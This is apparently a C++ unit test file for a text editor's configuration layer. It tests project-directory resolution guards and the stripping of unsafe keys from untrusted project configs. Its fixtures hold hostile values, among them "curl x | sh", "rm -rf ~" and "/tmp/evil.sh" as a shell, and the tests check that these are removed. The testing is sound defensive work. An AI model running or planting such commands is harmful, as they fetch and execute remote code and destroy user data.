//
// Created by gnilk on 19.08.23.
//
#include <testinterface.h>
#include <filesystem>
#include <fstream>
#include "Core/Config/ConfigNode.h"
#include "Core/Config/Config.h"
#include "Core/Editor.h"


using namespace gedit;

extern "C" {
DLL_EXPORT int test_config(ITesting *t);
DLL_EXPORT int test_config_setint(ITesting *t);
DLL_EXPORT int test_config_setdyn(ITesting *t);
DLL_EXPORT int test_config_projectdir_cwd(ITesting *t);
DLL_EXPORT int test_config_projectdir_folderarg(ITesting *t);
DLL_EXPORT int test_config_projectdir_guards(ITesting *t);
DLL_EXPORT int test_config_project_strip(ITesting *t);
DLL_EXPORT int test_config_project_strip_section(ITesting *t);
DLL_EXPORT int test_config_project_merge(ITesting *t);
}

DLL_EXPORT int test_config(ITesting *t) {
    return kTR_Pass;
}

DLL_EXPORT int test_config_setint(ITesting *t) {
    ConfigNode node;

    node.SetInt("test1", 25);
    TR_ASSERT(t, node.GetInt("test1", -1) == 25);
    node.SetInt("test2", 50);
    TR_ASSERT(t, node.GetInt("test2", -1) == 50);

    auto s = node.ToString();
    printf("str: %s\n", s.c_str());
    return kTR_Pass;
}

enum kDummyTest : int {
    kApa = 1,
    kBpa = 2,
};
DLL_EXPORT int test_config_setdyn(ITesting *t) {
    ConfigNode node;

    node.SetValue<int>("bla",2);
    TR_ASSERT(t, node.GetInt("bla", -1) == 2);

    node.SetValue<std::string>("bla2","hello");
    TR_ASSERT(t, node.GetStr("bla2", "wef") == "hello");

    node.SetValue<int>("enum", kDummyTest::kApa);
    TR_ASSERT(t, node.GetValue<int>("enum", -1) == kDummyTest::kApa);

    return kTR_Pass;
}
// A scratch "home" with a few candidate project roots - ResolveProjectDir takes home as a parameter, so
// the guards are tested without touching the real $HOME.
static std::filesystem::path MakeFakeHome() {
    auto home = std::filesystem::temp_directory_path() / "goatedit_projcfg_test" / "home";
    std::error_code ec;
    std::filesystem::remove_all(home.parent_path(), ec);
    std::filesystem::create_directories(home / ".goatedit");               // ~/.goatedit (user dir, never a project)
    std::filesystem::create_directories(home / "proj" / ".goatedit");
    std::filesystem::create_directories(home / "other" / ".goatedit");
    std::filesystem::create_directories(home / "bare");                     // no .goatedit
    std::filesystem::create_directories(home.parent_path() / "outside" / ".goatedit");
    return home;
}

DLL_EXPORT int test_config_projectdir_cwd(ITesting *t) {
    auto home = MakeFakeHome();
    auto dir = Editor::ResolveProjectDir({}, home / "proj", home);
    TR_ASSERT(t, dir.has_value());
    TR_ASSERT(t, dir.value() == home / "proj" / ".goatedit");
    return kTR_Pass;
}

DLL_EXPORT int test_config_projectdir_folderarg(ITesting *t) {
    auto home = MakeFakeHome();
    // A folder argument beats the cwd; file arguments don't count; the LAST folder wins (it's where
    // OpenDocumentOrFolder leaves the cwd).
    auto file = (home / "proj" / "file.txt").string();
    { std::ofstream f(file); f << "x"; }
    auto dir = Editor::ResolveProjectDir({file, (home / "other").string()}, home / "proj", home);
    TR_ASSERT(t, dir.has_value());
    TR_ASSERT(t, dir.value() == home / "other" / ".goatedit");

    dir = Editor::ResolveProjectDir({(home / "other").string(), (home / "proj").string()}, home / "bare", home);
    TR_ASSERT(t, dir.has_value());
    TR_ASSERT(t, dir.value() == home / "proj" / ".goatedit");

    // Only a file argument -> the cwd decides
    dir = Editor::ResolveProjectDir({file}, home / "other", home);
    TR_ASSERT(t, dir.has_value());
    TR_ASSERT(t, dir.value() == home / "other" / ".goatedit");
    return kTR_Pass;
}

DLL_EXPORT int test_config_projectdir_guards(ITesting *t) {
    auto home = MakeFakeHome();
    // $HOME itself is never a project ('~/.goatedit' is the user dir)
    TR_ASSERT(t, !Editor::ResolveProjectDir({}, home, home).has_value());
    // No .goatedit -> nothing (resolving never creates it)
    TR_ASSERT(t, !Editor::ResolveProjectDir({}, home / "bare", home).has_value());
    TR_ASSERT(t, !std::filesystem::exists(home / "bare" / ".goatedit"));
    // Outside home - even with a .goatedit
    auto outside = home.parent_path() / "outside";
    TR_ASSERT(t, !Editor::ResolveProjectDir({}, outside, home).has_value());
    // An outside folder arg is the root (not a fallback to the cwd's project)
    TR_ASSERT(t, !Editor::ResolveProjectDir({outside.string()}, home / "proj", home).has_value());
    // A bare folder arg doesn't fall back to the cwd's project either
    TR_ASSERT(t, !Editor::ResolveProjectDir({(home / "bare").string()}, home / "proj", home).has_value());
    return kTR_Pass;
}

DLL_EXPORT int test_config_project_strip(ITesting *t) {
    auto projectConfig = ConfigNode::FromString(
        "main:\n"
        "  bootstrap_scripts:\n"
        "    - evil.script\n"
        "  plugin_directory: /tmp/evil\n"
        "  theme: project.theme.yml\n"
        "terminal:\n"
        "  shell: /tmp/evil.sh\n"
        "  init: -c 'curl x | sh'\n"
        "  bootstrap:\n"
        "    - rm -rf ~\n"
        "  scrollback_lines: 42\n"
        "logging:\n"
        "  logfile: /tmp/evil.log\n"
        "editorview:\n"
        "  wrap: word\n");
    TR_ASSERT(t, projectConfig.has_value());
    auto removed = Config::StripProjectUnsafeKeys(projectConfig.value());
    TR_ASSERT(t, removed.size() == 6);

    auto &cfg = projectConfig.value();
    TR_ASSERT(t, !cfg["main"].HasKey("bootstrap_scripts"));
    TR_ASSERT(t, !cfg["main"].HasKey("plugin_directory"));
    TR_ASSERT(t, !cfg["terminal"].HasKey("shell"));
    TR_ASSERT(t, !cfg["terminal"].HasKey("init"));
    TR_ASSERT(t, !cfg["terminal"].HasKey("bootstrap"));
    TR_ASSERT(t, !cfg["logging"].HasKey("logfile"));
    // Everything else survives
    TR_ASSERT(t, cfg["main"].GetStr("theme") == "project.theme.yml");
    TR_ASSERT(t, cfg["terminal"].GetInt("scrollback_lines") == 42);
    TR_ASSERT(t, cfg["editorview"].GetStr("wrap") == "word");
    return kTR_Pass;
}

DLL_EXPORT int test_config_project_strip_section(ITesting *t) {
    // A section given as a scalar would replace the whole section on merge - the section goes.
    auto projectConfig = ConfigNode::FromString(
        "terminal: /tmp/evil.sh\n"
        "editorview:\n"
        "  wrap: word\n");
    TR_ASSERT(t, projectConfig.has_value());
    auto removed = Config::StripProjectUnsafeKeys(projectConfig.value());
    TR_ASSERT(t, !projectConfig->HasKey("terminal"));
    TR_ASSERT(t, removed.size() == 1);
    TR_ASSERT(t, (*projectConfig)["editorview"].GetStr("wrap") == "word");
    return kTR_Pass;
}

DLL_EXPORT int test_config_project_merge(ITesting *t) {
    // The safety property: after strip + merge the base keeps its own values for denied keys, while
    // allowed keys take the project's value.
    auto base = ConfigNode::FromString(
        "terminal:\n"
        "  shell: /bin/zsh\n"
        "  bootstrap:\n"
        "    - ls\n"
        "editorview:\n"
        "  wrap: none\n");
    auto projectConfig = ConfigNode::FromString(
        "terminal:\n"
        "  shell: /tmp/evil.sh\n"
        "  bootstrap:\n"
        "    - rm -rf ~\n"
        "editorview:\n"
        "  wrap: word\n");
    TR_ASSERT(t, base.has_value() && projectConfig.has_value());
    Config::StripProjectUnsafeKeys(projectConfig.value());
    base->MergeNode(projectConfig.value());

    TR_ASSERT(t, (*base)["terminal"].GetStr("shell") == "/bin/zsh");
    auto bootstrap = (*base)["terminal"].GetSequenceOfStr("bootstrap");
    TR_ASSERT(t, bootstrap.size() == 1);
    TR_ASSERT(t, bootstrap[0] == "ls");
    TR_ASSERT(t, (*base)["editorview"].GetStr("wrap") == "word");
    return kTR_Pass;
}
